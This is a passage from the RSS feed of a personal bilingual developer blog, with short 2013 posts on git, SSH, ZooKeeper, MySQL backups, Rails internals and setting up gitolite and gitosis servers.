&lt;p&gt;现在服务器的配置被运维同学限制了，无法连到SCM 服务器 (同时无法连接到外网，无法连接到很多内部网络，比如LDAP， RADIUS等等）。肿么办???? &amp;#160; &amp;#160; &amp;#160;(but one day, the server was limited its access to the internet, git repo and local LDAP , Radius service... what shall we do? )&lt;/p&gt;
&lt;p&gt;如果用SVN的话，就得 用SCP的方式，打包过去，然后修修改改，每次都要人肉来做，还出错。(if using SVN, we have to copy the entire code folder to the target server, easy to make mistake and really painful for me )&amp;#160;&lt;/p&gt;
&lt;p&gt;现在换成了GIT ， 不用capistrano的话，直接在本地把 git-patch 上传过去，然后 git am 就好。(now since we have migrated the SVN to GIT repo, it's very easy to achieve the same goal using 'git-patch' and 'git am' )&lt;/p&gt;
&lt;p&gt;用了 capistrano的话，用 deploy_via :scp 的 方式，我每次部署一行命令，自动搞定了。 ( and in capistrano, we just need to use 'deploy_via scp' to do the deployment job )&amp;#160;&lt;/p&gt;
&lt;p&gt;所以，老式的办法，在某些新问题出现的时刻，不是那么得心应手。业界流行的“最佳实践”，在大部分情况下，还是“最佳实践”的。 ^_^ &amp;#160; &amp;#160;( the conclusion is: &amp;#160;best practices are always best in most cases. )&amp;#160;&lt;/p&gt;
&lt;p&gt;—— 学习是王道！ &amp;#160;( keep STUDYING everyday! )&amp;#160;&lt;/p&gt;</description>
      <pubDate>Fri, 15 Mar 2013 01:09:00 +0000</pubDate>
      <link>http://siwei.me/blog/posts/best-practices-are-best</link>
    </item>
    <item>
      <title>ssh/git 非常慢的解决办法 (ssh/git login extremely slow's solution) </title>
      <description>&lt;p&gt;今天终于忍不住了。进入公司3个月以来，SSH 登录服务器特别慢。而其他同事用MAC非常快。&lt;/p&gt;
&lt;p&gt;搜了一下，找到了解决办法：&amp;#160;   &lt;a href="http://superuser.com/questions/166359/top-causes-of-slow-ssh-logins"&gt;http://superuser.com/questions/166359/top-causes-of-slow-ssh-logins&lt;/a&gt;
&lt;/p&gt;
&lt;p&gt;ssh root@xx.xx.xx -vvv &lt;/p&gt;
&lt;p&gt; 如果发现在这里速度很忙，停住了：debug1: Next authentication method: gssapi-with-mic ， 那么你就需要修改文件：&lt;/p&gt;
&lt;pre&gt;# vim /etc/ssh/ssh_config :
GSSAPIAuthentication no
&lt;/pre&gt;
&lt;p&gt; 现在SSH速度如飞啊亲！&lt;/p&gt;</description>
      <pubDate>Thu, 14 Mar 2013 11:51:00 +0000</pubDate>
      <link>http://siwei.me/blog/posts/ssh-git-login-extremely-slow</link>
    </item>
    <item>
      <title>git tag 基本操作 （ git tagging basic   ）</title>
      <description>&lt;p&gt;$ git tag -l &amp;#160;查看所有的tag&amp;#160;&lt;/p&gt;
&lt;pre&gt;$ git tag -a 1.1.0 a50fabb -m 'message content .... '
&lt;/pre&gt;
&lt;p&gt;$ git tag -d 1.0 &amp;#160; # will remove tag 1.0&lt;/p&gt;
&lt;p&gt;$ git tag -n2 &amp;#160; # will show the tags with their messages.&amp;#160;&lt;/p&gt;
&lt;pre&gt;1.0.0           CMS 3.0 的抢先版，....
1.0.1           3月14日下午.修改了若干BUG（大部分都是表单验证）...
&lt;/pre&gt;
&lt;p&gt;$ git push --tags &amp;#160;# push local tags to remote server&lt;/p&gt;
&lt;p&gt; $ git ls-remote --tags  # list all the remote tags 
&lt;/p&gt;
&lt;pre&gt;From ssh://....
a70cffc64e73ae4b5ab7329480999305f11d9c76	refs/tags/1.0.0
6d1ad6c601652442d6d32fce5233ba50a1dd9f56	refs/tags/1.0.0^{}
1acf5e9aabbd353ff45b7aa3fe319d3822acad19	refs/tags/1.0.1
5bba7a637e64267ffad38dd48c30df00da6cc91e	refs/tags/1.0.1^{}
&lt;/pre&gt;
</description>
      <pubDate>Thu, 14 Mar 2013 09:50:00 +0000</pubDate>
      <link>http://siwei.me/blog/posts/git-tagging-101</link>
    </item>
    <item>
      <title>生成所有的rdoc （ generate all the rdocs for all/specific gem )</title>
      <description>&lt;p&gt;我简直太笨了！ 今天才知道，如何为某个GEM生成RDOC，并且自动放到 $ gem server 可以识别的路径下。 ( I am really a fool that I didn't know (until today) how to generate a specific/all gems' rdoc files and put them automatically somewhere that '$gem server' could recognize. )&lt;/p&gt;
&lt;p&gt;$ gem rdoc --rdoc zookeeper &lt;/p&gt;
&lt;p&gt; 然后 $ gem server ， 打开 localhost:8808 就可以看到最新生成的rdoc 文件了。 想想自己太笨了，以前居然RDOC之后还要手动COPY。。。哎，学习是王道，google是王道啊。 （这个答案在 这里已经有了： &lt;a href="http://stackoverflow.com/questions/664651/can-you-install-documentation-for-existing-gems"&gt;http://stackoverflow.com/questions/664651/can-you-install-documentation-for-existing-gems&lt;/a&gt; ) &lt;/p&gt;
&lt;p&gt; 

附： gem help rdoc给出的帮助信息，
&lt;/p&gt;
&lt;pre&gt;$ gem help rdoc
Usage: gem rdoc [args] [options]

  Options:
        --all                        Generate RDoc/RI documentation for all
                                     installed gems
        --[no-]rdoc                  Generate RDoc HTML

  Arguments:
    GEMNAME       gem to generate documentation for (unless --all)
&lt;/pre&gt;</description>
      <pubDate>Wed, 13 Mar 2013 01:34:00 +0000</pubDate>
      <link>http://siwei.me/blog/posts/generating-rdoc-for-rubygems</link>
    </item>
    <item>
      <title>zookeeper 的急速入门( zookeeper basic operations ) </title>
      <description>&lt;p&gt;算是我的学习笔记吧。 记录如下： ( 原文见：&amp;#160;&lt;a href="http://zookeeper.apache.org/doc/trunk/zookeeperStarted.html#sc_InstallingSingleMode" title="http://zookeeper.apache.org/doc/trunk/zookeeperStarted.html#sc_InstallingSingleMode" target="_blank"&gt;http://zookeeper.apache.org/doc/trunk/zookeeperStarted.html#sc_InstallingSingleMode&lt;/a&gt; &amp;#160;)&amp;#160;&lt;/p&gt;
&lt;p&gt;1. 安装并运行： download the file, unzip it. &amp;#160;then $ bin/zkServer.sh start
&lt;/p&gt;
&lt;p&gt;2. 使用JAVA客户端连接zookeeper 服务器：&amp;#160;&lt;/p&gt;
&lt;p&gt;$ bin/zkCli.sh -server 127.0.0.1:2181 &lt;/p&gt;
&lt;p&gt;3. 基本操作来了： &amp;#160; &lt;/p&gt;
&lt;pre&gt;$ ls /
[zookeeper]
$ ls /zookeeper
[quota]
$ create /siwei my_data
Created /siwei

$ get /siwei
my_data
cZxid = 0x19
ctime = Wed Mar 13 09:13:43 CST 2013
mZxid = 0x19
.......   

$ set /siwei junk
cZxid = 0x19
ctime = Wed Mar 13 09:13:43 CST 2013
mZxid = 0x1a
.....

$ get /siwei
junk
cZxid = 0x19
ctime = Wed Mar 13 09:13:43 CST 2013

$ delete /siwei
$ ls /
[zookeeper]



&lt;/pre&gt;</description>
      <pubDate>Wed, 13 Mar 2013 01:15:00 +0000</pubDate>
      <link>http://siwei.me/blog/posts/zookeeper-basic-operatons</link>
    </item>
    <item>
      <title>ruby 操作zookeeper 的比较  (zookeeper ruby clients comparison) </title>
      <description>&lt;p&gt;为了寻找一个比较合适的RUBY ZOOKEEPER客户端，搜索了一下。( I am involving a project that uses zookeeper as a component and I am looking for a suitable ruby client for zookeeper. and I googled around with the results below: &amp;#160;)&lt;/p&gt;
&lt;p&gt; 1. &lt;a href="https://github.com/myelin/zookeeper_client"&gt;https://github.com/myelin/zookeeper_client&lt;/a&gt; 比较古老，5年前的东东了， 一直没更新啊有木有。 虽然看起来 一些基本操作都支持，但是没人维护了。果断不用。 ( its last commit is 5 year ago, it's out of date, although it supports all the basic operations like : get, set ... )&amp;#160;&lt;/p&gt;
&lt;p&gt; 2. &lt;a href="https://github.com/slyphon/zookeeper"&gt;https://github.com/slyphon/zookeeper&lt;/a&gt; 这个是比较新的客户端，用作者的原话是 ruby low level wrapper for zookeeper.  看了下文档，它应该是前者的加强版。前者有的功能它这里都有（有意思的是前者的文档被他原封不动的复制过来了^_^）  最新的提交时间是22天前，说明维护和开发还在持续进行中。 ( this is newer, its last commit is 22 days ago, it's the 'ruby low level wrapper for zookeeper, and it's a super set for the previous one. )&lt;/p&gt;
&lt;p&gt; 另外，第二个项目的作者，他还有另外一个 high level ruby wrapper for zookeeper ( 见 &lt;a href="https://github.com/slyphon/zk"&gt;https://github.com/slyphon/zk&lt;/a&gt; ）&lt;/p&gt;
&lt;p&gt; 所以，果断选择第二种啊。 ( I decided to use the latter one in my project without a hesitate. )&amp;#160;&lt;/p&gt; </description>
      <pubDate>Wed, 13 Mar 2013 00:52:00 +0000</pubDate>
      <link>http://siwei.me/blog/posts/zookeeper-ruby-clients-comparison</link>
    </item>
    <item>
      <title>一点点git的分支知识（more about git branch ) </title>
      <description>&lt;p&gt; $ git branch -a 的结果：  ( this morning, I ran a GIT command and got its result: )&lt;/p&gt;
&lt;pre&gt;sg552@youku:/sg552/workspace/m-cms$ git branch -a
  clean_cache
* master
  siwei_branch
  remotes/origin/HEAD -&amp;gt; origin/master
  remotes/origin/master
  remotes/origin/siwei_branch
&lt;/pre&gt;
&lt;p&gt; 我很好奇， origin/HEAD  和  origin/master 都是啥，两者有啥关系。搜索了一下，发现： origin/HEAD是默认的checkout 分支。 HEAD-》 master 表示 默认的分支就是origin/master.  ( I am curious about what are the HEAD and origin/master, what relationship is between them. after googling around, i found that origin/HEAD is the default cloned branch , and it's pointing to origin/master in my case ) &lt;/p&gt;
&lt;p&gt; 命令： git remote show origin 可以显示本地和远程的origin 上的分支情况  ( command $ git remote show origin lists the branches in local and remotely ) &lt;/p&gt;

&lt;pre&gt;sg552@youku:/sg552/workspace/m-cms$ git remote show origin
* remote origin
  Fetch URL: ssh://shensiwei@gforge.1verge.net:22022/gitroot/m-cms
  Push  URL: ssh://shensiwei@gforge.1verge.net:22022/gitroot/m-cms
  HEAD branch: master
  Remote branches:
    master       tracked
    siwei_branch tracked
  Local branch configured for 'git pull':
    master merges with remote master
  Local refs configured for 'git push':
    master       pushes to master       (up to date)
    siwei_branch pushes to siwei_branch (fast-forwardable)
&lt;/pre&gt;</description>
      <pubDate>Wed, 06 Mar 2013 01:12:00 +0000</pubDate>
      <link>http://siwei.me/blog/posts/more-about-git-branch</link>
    </item>
    <item>
      <title>Merge 与 Base的优缺点  ( GIT Merge v.s. Rebase  )</title>
      <description>看这里： &lt;a href="http://www.jarrodspillers.com/2009/08/19/git-merge-vs-git-rebase-avoiding-rebase-hell/"&gt;http://www.jarrodspillers.com/2009/08/19/git-merge-vs-git-rebase-avoiding-rebase-hell/ &lt;/a&gt;


Conclusion:

Merge works great, but creates lots of empty merge commits when you are working on a team.
Rebase keeps things tidy, but is destructive and potentially dangerous if you don’t know what you are doing.
Keep yourself safe with a simple rule:

Don’t rebase branches you have shared with another developer.

Do otherwise at your own peril - yes, it will hurt.
</description>
      <pubDate>Mon, 04 Mar 2013 09:29:00 +0000</pubDate>
      <link>http://siwei.me/blog/posts/git-merge-vs-rebase</link>
    </item>
    <item>
      <title>grep patterns</title>
      <description>cat cms_production_2013-02-20.log | grep 'in [0-9]\{4,6\}ms'

find ' in xxxms'  logs. </description>
      <pubDate>Fri, 01 Mar 2013 13:17:00 +0000</pubDate>
      <link>http://siwei.me/blog/posts/grep-patterns</link>
    </item>
    <item>
      <title>磁带转mp3    (converting tape to mp3 file  )</title>
      <description>&lt;p&gt;1. 使用 audacity。它有录音功能 (using audacity to record)&lt;/p&gt;
&lt;p&gt;2. 需要有个磁带机（我买的复读机，70块一个，360上），有一根双头音频线。 ( you need a tape reader, ￥70 RMB , a double ended audio cable )&lt;/p&gt;
&lt;p&gt;3. 一段接在磁带机的耳机上，是声音输出，另外一段接在电脑声卡的line in 上。( one end to the tape reader, another end should be plugged into the 'linein' port of your sound card )&amp;#160;&lt;/p&gt;
&lt;p&gt;4. 记得要设置 电脑的 音频属性， linein 那里要 设置音量比较大才好啊。 但是不要过大。 ubuntu下，选择 unamplified 就好。 &amp;#160; (config the source preference of you PC. &amp;#160;make sure the&amp;#160;volume&amp;#160;is not too low )&lt;/p&gt;
&lt;p&gt;&lt;img src="/system/images/BAhbBlsHOgZmSSIwMjAxMy8wMi8yNy8xM180MF8xNF83Mjdfc291bmRfcmVjb3JkaW5nLnBuZwY6BkVU/sound-recording.png" title="Sound Recording" alt="Sound Recording" rel="225x255" width="1280" height="800" /&gt;&lt;/p&gt;
&lt;p&gt;5. 设置audacity, &amp;#160;edit -&amp;gt; preference -&amp;gt; devices -&amp;gt; recording 选择 &amp;#160;pulse: line: 0&lt;/p&gt;
&lt;p&gt;&lt;img src="/system/images/BAhbBlsHOgZmSSI3MjAxMy8wMi8yNy8xM180MV8yMV8xMzRfY29uZmlnX2F1ZGFjaXR5X2RldmljZS5wbmcGOgZFVA/config_audacity_device.png" title="Config Audacity Device" alt="Config Audacity Device" rel="225x255" width="1280" height="800" /&gt;&lt;/p&gt;
&lt;p&gt;6. 点击录音，就可以录了。 然后试着听一下，看效果是否满意吧！ :) &amp;#160; &amp;#160;( then you can get started ! )&amp;#160;&lt;/p&gt;</description>
      <pubDate>Wed, 27 Feb 2013 05:31:00 +0000</pubDate>
      <link>http://siwei.me/blog/posts/converting-tape-to-mp3</link>
    </item>
    <item>
      <title>backup &amp; restore all the Mysql databases</title>
      <description>&lt;p&gt;$ mysqldump -u root --all-databases &amp;gt; all_databases-2013-02-25.sql&lt;/p&gt;
&lt;p&gt;$ mysqldump -u&amp;lt;user_name&amp;gt; -p&amp;lt;pwd&amp;gt; -h10.103.&amp;lt;ip&amp;gt; --all-databases &amp;gt; all_databases-2013-03-12.sql&lt;/p&gt;
&lt;p&gt;$ mysql -uroot -pecare2@ &amp;lt; alldatabases.sql&lt;/p&gt;</description>
      <pubDate>Mon, 25 Feb 2013 09:57:00 +0000</pubDate>
      <link>http://siwei.me/blog/posts/backup-and-restore-all-databases-for-mysql</link>
    </item>
    <item>
      <title>Github 的顶级项目 (top projects on github ) </title>
      <description>&lt;p&gt;&lt;a href="https://github.com/search?l=&amp;amp;p=1&amp;amp;q=stars:%22%3E+500%22&amp;amp;ref=advsearch&amp;amp;type=Repositories" title="https://github.com/search?l=&amp;amp;p=1&amp;amp;q=stars:%22%3E+500%22&amp;amp;ref=advsearch&amp;amp;type=Repositories" target="_blank"&gt;https://github.com/search?l=&amp;amp;p=1&amp;amp;q=stars:%22%3E+500%22&amp;amp;ref=advsearch&amp;amp;type=Repositories&lt;/a&gt;
&lt;/p&gt;</description>
      <pubDate>Wed, 20 Feb 2013 22:32:00 +0000</pubDate>
      <link>http://siwei.me/blog/posts/top-projects-on-github</link>
    </item>
    <item>
      <title>调试js 也要关注它的调用过程(debugging jquery error )</title>
      <description>&lt;p&gt;这几天发现了一个奇怪的JQUERY问题，页面加载后，打开developer tools, 发现有的页面有JS错误提示，说jquery.js 79行 有问题，有的页面就没有。 ( these days I am struggling about a jquery problem. when the page is loaded, the 'developer tool' complaints that there's a js error, saying that jquery.js has problems on line 75.&amp;#160;&lt;/p&gt;
&lt;p&gt;&lt;img src="/system/images/BAhbBlsHOgZmSSIyMjAxMy8wMi8yMS8wOV8yMF81MV82OTVfanNfZXJyb3JfY29sbGFwc2UucG5nBjoGRVQ/js-error-collapse.png" title="Js Error Collapse" alt="Js Error Collapse" rel="450x450" width="533" height="132" /&gt;&lt;/p&gt;
&lt;p&gt;很奇怪，jquery.js 这个源文件内容是完整的，正确的。没问题啊～～～ &amp;#160;(but it's obviously that the jquery.js file is normal and correct )&lt;/p&gt;
&lt;p&gt;我甚至做了diff, 一点一点的排查正常页面和问题页面的区别，也没发现，直到昨天下午，点了一下developer tools 中提示JS错误的向下的箭头，才发现这个JS 出错提示，是可以打开的（ back stack trace ... ) &amp;#160;可以查看所有JS代码的调用过程。 ( I didn't find any problem after 'diff' the good page and the problem-page, until yesterday afternoon, I clicked the '-&amp;gt;' right arrow of the error message on developer tool. &amp;#160;)&amp;#160;&lt;/p&gt;
&lt;p&gt;终于发现，根源在另外一个js 文件中。。。 呵呵。。。于是问题很快解决了～ &amp;#160;( and I found the root cause of this error. now problem solved! )&amp;#160;&lt;/p&gt;
&lt;p&gt;&lt;img src="/system/images/BAhbBlsHOgZmSSIwMjAxMy8wMi8yMS8wOV8yMV8wMl80NzZfanNfZXJyb3JfdW5mb2xkLnBuZwY6BkVU/js-error-unfold.png" title="Js Error Unfold" alt="Js Error Unfold" rel="450x450" width="534" height="269" /&gt;&lt;/p&gt;</description>
      <pubDate>Wed, 20 Feb 2013 21:58:00 +0000</pubDate>
      <link>http://siwei.me/blog/posts/debugging-jquery</link>
    </item>
    <item>
      <title>使用 request-log-analyzer 分析Rails 日志（using request-log-analyzer to analyze your Rails log ) </title>
      <description>&lt;p&gt;这个东东非常强大，可以分析Rails, Merb, Nginx, Apache, MySQL, postgres,  等各种日志。 &amp;#160;( it supports many formats of logs , including: mysql, postgres, apache .nginx ... ) &lt;/p&gt;
&lt;p&gt;$ gem install request-log-analyzer&amp;#160;&lt;/p&gt;
&lt;p&gt;简单用法： 分析一个文件，并且把它输出到 report-for-cms-logs.html 中： (simple usage: analyze and export the result to a file ) &lt;/p&gt;
&lt;p&gt;$ request-log-analyzer cms_production_2013-02-17.log --format rails3 --output HTML --file report-for-cms-logs.html&lt;/p&gt;</description>
      <pubDate>Mon, 18 Feb 2013 09:22:00 +0000</pubDate>
      <link>http://siwei.me/blog/posts/analyze-your-rails-log</link>
    </item>
    <item>
      <title>Ruby meta programming spell: alias_method_chain</title>
      <description>&lt;p&gt;了解这个spell的基础是，你要知道 alias_method ：的用法：  alias_method :new_name, :old_name &lt;/p&gt; 
&lt;p&gt;这个东东非常常见，遍及RAILS代码的每个角落。起源是：&lt;/p&gt;
&lt;p&gt;1. 假设我们希望为某个方法加上新功能：&amp;#160; 可以用 alias_method.  &lt;/p&gt;
&lt;pre&gt;ActionController::TestCase.class_eval do
  # save a reference to the original process method
  alias_method :original_process, :process
 
  # now redefine process and delegate to original_process
  def process(action, params=nil, session=nil, flash=nil, http_method='GET')
    params = Hash[*params.map {|k, v| [k, v.to_s]}.flatten]
    original_process(action, params, session, flash, http_method)
  end
end
&lt;/pre&gt;
&lt;p&gt;2. 上面的方法有一点风险：如果 original_process 这个方法名已经被使用了的话，程序就会不正常。所以，为了避免这个问题，大家习惯于为新方法加一个文字后缀：&lt;/p&gt;
&lt;pre&gt;ActionController::TestCase.class_eval do
  def process_with_stringified_params(...)
    params = Hash[*params.map {|k, v| [k, v.to_s]}.flatten]
    process_without_stringified_params(action, params, session, flash, http_method)
  end
  alias_method :process_without_stringified_params, :process
  alias_method :process, :process_with_stringified_params
end
&lt;/pre&gt;
&lt;p&gt; 3. 后来大家觉得一次写两个alias_method 好麻烦啊。 因为目的仅仅是为了新增加一个方法。而不是要改动两个方法。所以，就诞生了 alias_method_chain: &lt;/p&gt;
&lt;pre&gt;ActionController::TestCase.class_eval do
  def process_with_stringified_params(...)
    params = Hash[*params.map {|k, v| [k, v.to_s]}.flatten]
    process_without_stringified_params(action, params, session, flash, http_method)
  end
  # 这里是核心，替代了原来的两个 alias_method.  
  alias_method_chain :process, :stringified_params
end
&lt;/pre&gt;</description>
      <pubDate>Sun, 17 Feb 2013 03:32:00 +0000</pubDate>
      <link>http://siwei.me/blog/posts/alias-method-chain</link>
    </item>
    <item>
      <title>Rails的精髓之：ActiveSupport ( studying acitve-support) </title>
      <description>&lt;p&gt;用了Rails 4年多了。不过还没认真看过ActiveSupport. 只是发现很多优雅的方法都是出自于其中：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;blank?&amp;#160;&lt;/li&gt;
&lt;li&gt;in?&lt;/li&gt;
&lt;li&gt;revert_merge&lt;/li&gt;
&lt;li&gt;try&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;所以，今天看了一下。发现最重要的一点是：如何引用 ActiveSupport:&lt;/p&gt;
&lt;p&gt;require 'active_support' &amp;#160;# doesn't work&lt;/p&gt;
&lt;p&gt;require 'active_support/all' &amp;#160;# ok!&amp;#160;&lt;/p&gt;
&lt;p&gt; 下面是一些翻译： (参考：&lt;a href="http://guides.rubyonrails.org/active_support_core_extensions.html"&gt;http://guides.rubyonrails.org/active_support_core_extensions.html&lt;/a&gt;) &lt;/p&gt;

&lt;p&gt;1. blank? v.s. present?  &lt;/p&gt;
&lt;p&gt; blank?  :   nil, false,  '',  空数组，空Hash, 以及 所有empty? == true 的，都是 返回true &lt;/p&gt;
&lt;p&gt; present?  == !blank? 
&lt;/p&gt;
&lt;p&gt;2. presence:  返回它的  present?  ? receiver : nil  &lt;/p&gt; 
&lt;pre&gt;  host = config[:host].presence || 'localhost' &lt;/pre&gt;
&lt;p&gt;3. duplicable?  能否复制？&lt;/p&gt;
&lt;pre&gt; "".duplicable?     # =&amp;gt; true
false.duplicable?  # =&amp;gt; false
&lt;/pre&gt;
&lt;p&gt;4. try:  试着调用某个方法。出现exception 就返回nil  &lt;/p&gt;
&lt;p&gt;5. singleton_class:  貌似跟eigen_class 有关。。。 目前我用的不多。只记得前者的获取比较麻烦。又要 def &amp;lt;&amp;lt; self 啥的。。。&lt;/p&gt;
&lt;p&gt;6. class_eval  这个不陌生了。。。用的很多地方&lt;/p&gt;
&lt;p&gt;7. acts_like?(:some_thing):  如果某个class 中定义了: def acts_like_banana? ; ... ; end,  这时， acts_like? :banana =&amp;gt; true  &lt;/p&gt;
&lt;p&gt;8. to_param: &amp;#160;对于active_model, 默认返回id.&amp;#160;&lt;/p&gt;
&lt;p&gt;9. to_query:&amp;#160;{:c =&amp;gt; 3, :b =&amp;gt; 2, :a =&amp;gt; 1}.to_query # =&amp;gt; "a=1&amp;amp;b=2&amp;amp;c=3" 
&lt;/p&gt;
&lt;p&gt;10. with_options ... 用来简化代码的。。。&lt;/p&gt;
&lt;p&gt;11. instance variables:&lt;/p&gt;
&lt;pre&gt;instance_variable_names  返回的都是字符
instance_values  
&lt;/pre&gt;
&lt;p&gt;12. silence_warnings, &amp;#160;silence_stream, quietly ...&amp;#160;&lt;/p&gt;
&lt;p&gt;13 in? &amp;#160; &amp;#160; 1.in? [1,2,3] # =&amp;gt; true&lt;/p&gt;
&lt;p&gt;太多了。。。先看到这里。&lt;/p&gt;
</description>
      <pubDate>Sun, 17 Feb 2013 03:02:00 +0000</pubDate>
      <link>http://siwei.me/blog/posts/studying-active-support</link>
    </item>
    <item>
      <title>SVN 到 GIT 的转换（converting svn to git）</title>
      <description>&lt;p&gt;1.&amp;#160;sudo apt-get install git-svn &amp;#160; (make sure you have the 'git svn' installed )&amp;#160;&lt;/p&gt;
&lt;p&gt;2.&amp;#160;First you have to create a file that maps your Subversion commit author names to Git commiters, say ~/authors.txt:&lt;/p&gt;
&lt;pre&gt;jmaddox = Jon Maddox &amp;lt;jon@gmail.com
bigpappa = Brian Biggs &amp;lt;bigpappa@gmail.com&amp;gt;&lt;/pre&gt;
&lt;p&gt;Then you can download the Subversion data into a Git repository:&lt;/p&gt;
&lt;pre&gt;mkdir repo &amp;amp;&amp;amp; cd repo&lt;br /&gt;git svn init http://subversion/repo --no-metadata&lt;br /&gt;git config svn.authorsfile ~/authors.txt&lt;br /&gt;git svn fetch&lt;/pre&gt;

&lt;p&gt;参考：(refer to:) &lt;a href="http://stackoverflow.com/questions/79165/how-to-migrate-svn-with-history-to-a-new-git-repository"&gt;http://stackoverflow.com/questions/79165/how-to-migrate-svn-with-history-to-a-new-git-repository&lt;/a&gt;
&lt;/p&gt;</description>
      <pubDate>Sun, 17 Feb 2013 01:27:00 +0000</pubDate>
      <link>http://siwei.me/blog/posts/converting-svn-to-git</link>
    </item>
    <item>
      <title>建立Gitolite ( setting up gitolite server) </title>
      <description>&lt;p&gt;gitosis 是比较古老的的GIT server。 我今天早上弄了一下，发现官方的文档很不好用啊亲！自己之前成功的搭建过，今天居然不行。搜索了一下，发现官方承认他们文档欠缺，而且网上的声音也认为它失效很久了（long-defunct ) 。大家都用 gitolite 来搭建GIT 服务。而且GITOLITE的GITHUB关注度是 4000+, GITOSIS 400。 所以，我打算用gitolite来做~~~ &amp;#160;(gitosis is an old product of git server. This morning I tried to setup a gitosis server, but failed on the last but two steps. I found its official document admits that it's lacking of document and out-of-date. And many posts say that "gitosis" is "defunct" , and let's use gitolite instead. On github, 4000+ people is watching gitolite, but only 400 watching gitosis. )&amp;#160;&lt;/p&gt;
&lt;p&gt;参考1：refer to :&amp;#160;&lt;a href="http://sitaramc.github.com/3-server-usage/git-server.html" title="http://sitaramc.github.com/3-server-usage/git-server.html" target="_blank"&gt;http://sitaramc.github.com/3-server-usage/git-server.html&lt;/a&gt;&amp;#160; &amp;#160;&lt;/p&gt;
&lt;p&gt;参考2：refer to :&amp;#160;&lt;a href="http://engineeredweb.com/blog/10/2/building-your-own-git-server/" title="http://engineeredweb.com/blog/10/2/building-your-own-git-server/" target="_blank"&gt;http://engineeredweb.com/blog/10/2/building-your-own-git-server/&lt;/a&gt;
&lt;/p&gt;
&lt;p&gt;1. login as 'git' user. &amp;#160;( useradd git, then passwd git , then su git ... )&amp;#160;&lt;/p&gt;
&lt;p&gt;2.&amp;#160;git clone git://github.com/sitaramc/gitolite&lt;/p&gt;
&lt;p&gt;3.&amp;#160;git clone git://github.com/sitaramc/gitolite&lt;br /&gt;            mkdir -p $HOME/bin&lt;br /&gt;            gitolite/install -to $HOME/bin&lt;br /&gt;home/git/bin/gitolite setup -pk YourName.pub&lt;/p&gt;
&lt;p style="color:red"&gt; 注意：这里的 ssh pub key 绝对不可以有密码。 &lt;/p&gt; 
&lt;p&gt;这时可以看到， gitolite为我们新建了 /home/git/repositories ... 等文件&lt;/p&gt;
&lt;pre&gt;-rw-rw-r-- 1 git git   12 Feb  9 15:10 projects.list
drwxrwxr-x 4 git git 4096 Feb  9 15:10 repositories
&lt;/pre&gt;
&lt;p&gt;4. 下面的用法跟 gitosis一样， 想加入用户，就进入到gitolite folder,：&lt;br /&gt;&amp;#160; 4.1 编辑 conf/gitolite.conf, 加入&amp;#160;&lt;br /&gt;        repo foo&lt;br /&gt;&amp;#160; RW+         =   alice&lt;br /&gt;&amp;#160; RW          =   bob&lt;br /&gt;&amp;#160; 4.2 把 alice 和 bob 的pub文件 都放到 keydir下。 &amp;#160;&lt;br /&gt;&amp;#160; 4.3 commit &amp;amp; push.&amp;#160;&lt;/p&gt;
&lt;p&gt;5. create new repo: &amp;#160;编辑 config/gitolite.conf， 增加&lt;/p&gt;
&lt;pre&gt;repo shuashua_printer
    RW+     =   @all&lt;/pre&gt;
&lt;p&gt;然后 commit &amp;amp; push gitolite-admin , 就可以了。&lt;/p&gt;</description>
      <pubDate>Sat, 09 Feb 2013 06:55:00 +0000</pubDate>
      <link>http://siwei.me/blog/posts/setting-up-gitolite-server</link>
    </item>
    <item>
      <title>建立个简单的git server: gitosis ( gitosis: setting up a git server without complex authorization)</title>
      <description>&lt;p style="color:red"&gt; 注意： Gitosis 已经过时了，貌似不再维护。建议使用 gitolite. ( gitosis is long-defunct , let's use gitolite instead ) . 
所以我安装到倒数第二步的时候就放弃了。 参考： &lt;a href="http://engineeredweb.com/blog/10/2/building-your-own-git-server/"&gt;http://engineeredweb.com/blog/10/2/building-your-own-git-server/&lt;/a&gt;
&lt;/p&gt;
&lt;p&gt;如果每个核心成员都拥有一样的权限，那么GIT SERVER就非常简单了。 ( it's very simple to setup a git server if every committer has the same authorization )&amp;#160;&lt;/p&gt;
&lt;p&gt;1. $ sudo apt-get install git-core &lt;/p&gt;
&lt;p&gt;2. setup git user: &lt;/p&gt;
&lt;pre&gt;sudo adduser \
--system \
--shell /bin/sh \
--gecos ‘git version control’ \
--group \
--disabled-password \
--home /home/git \
git
&lt;/pre&gt;
&lt;p&gt;3. $ su git &lt;br /&gt; $ mkdir ~/repositories &lt;/p&gt;
&lt;p&gt;4. $ su sg552 &lt;br /&gt;  $ sudo apt-get install python-setuptools ( which is used for gitosis' setup)&lt;/p&gt;
&lt;p&gt;5. get and setup gitosis : &lt;/p&gt;
&lt;pre&gt;cd /tmp
git clone https://github.com/res0nat0r/gitosis.git
cd gitosis
sudo python setup.py install
&lt;/pre&gt;
&lt;p&gt;6. $ gitosis-init &amp;lt;~/.ssh/id_rsa.pub &lt;/p&gt;
&lt;p&gt;7. $ cd /sg552/apps &amp;amp;&amp;amp; git clone sg552@192.168.1.36:gitosis-admin.git &amp;#160;( don't use: localhost as the server address)&amp;#160;&lt;/p&gt;
&lt;p&gt;8. $ edit your config file and submit ( sorry but I failed )&amp;#160;&lt;/p&gt;

&lt;p&gt;参考(refer to ) ：&lt;a href="https://github.com/res0nat0r/gitosis"&gt;  https://github.com/res0nat0r/gitosis &lt;/a&gt;
&lt;/p&gt;</description>
      <pubDate>Sat, 09 Feb 2013 00:29:00 +0000</pubDate>
      <link>http://siwei.me/blog/posts/setting-up-a-gitosis-server</link>
    </item>
    <item>
      <title>一个视图层的gem: apotomo ( rubygem apotomo for Rails. )</title>
      <description>&lt;h3 style="color:red"&gt; 好吧，我失败了。。。  没有成功的跑起来，虽然经过查看源代码等等修改，也还是一直有失败消息。我怀疑这个GEM 不兼容 3.2.11 ，或者作者已经停止维护了（上一次提交代码是2个月前，再一次是8个月前，还有20+ issue没有 解决， 好多pull request 没有处理）  (OK, I admit that I failed to manage  this to work. I don't think this gem is compatible with Rails 3.2.11, and its last commit is 2 month ago, last but 1 commit is 8 months ago, and a dozen issues not fixed, many pull requests not processed.  ) &lt;/h3&gt;

&lt;p&gt;这几天在调试 rubygem for rails (including views/controllers/... ) , 所以google到了apotomo, 记录一下。（these days I am creating a rails engine gem, so I found apotomo, a rails view components framework )&amp;#160;&lt;/p&gt;
&lt;p&gt;1. edit Gemfile: &amp;#160;gem 'apotomo'&lt;/p&gt;
